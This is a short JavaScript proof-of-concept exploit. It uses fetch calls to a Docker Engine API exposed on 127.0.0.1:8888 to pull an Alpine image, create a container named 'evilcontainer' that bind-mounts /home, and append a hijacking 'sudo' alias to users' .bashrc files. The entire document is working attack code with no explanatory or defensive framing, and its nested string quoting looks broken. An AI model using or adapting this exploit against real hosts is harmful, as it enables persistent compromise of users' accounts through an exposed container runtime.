```javascript
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function poc() {
  // Step 1: Download Alpine image
  fetch("http://127.0.0.1:8888/images/create?fromImage=docker.io/library/alpine:latest", {
    method: "POST"
  });
  await sleep(5000);

  // Step 2: Create container that modifies .bashrc
  fetch("http://127.0.0.1:8888/containers/create?name=evilcontainer", {
    method: "POST",
    body: JSON.stringify({
      Image: "alpine",
      Entrypoint: [
        "/bin/sh",
        "-c",
        "echo 'alias sudo="echo Doing evil stuff"' | tee -a /home/*/.bashrc"
      ],
      HostConfig: {
        Binds: [
          "/home:/home"
        ]
      }
    })
  });
  await sleep(2000);

  // Step 3: Start container
  fetch("http://127.0.0.1:8888/containers/evilcontainer/start", {
    method: "POST"
  });
}

poc();
```
